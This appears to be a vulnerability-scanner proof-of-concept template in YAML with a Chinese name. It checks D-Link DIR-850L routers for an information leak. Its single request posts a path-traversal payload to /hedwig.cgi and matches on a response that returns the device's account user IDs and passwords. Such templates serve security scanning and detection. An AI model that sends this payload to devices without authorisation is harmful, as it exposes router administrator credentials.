id: poc-yaml-dlink-850l-info-leak
info:
  name: Dlink 850l 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: DLink
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /hedwig.cgi
  headers:
    Content-Type: text/xml
    Cookie: uid=R8tBjwtFc8
  data: <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "xml") && contains(body, "</usrid>") && contains(body, "</password>") && contains(body,
    "<result>OK</result>")
  output: []
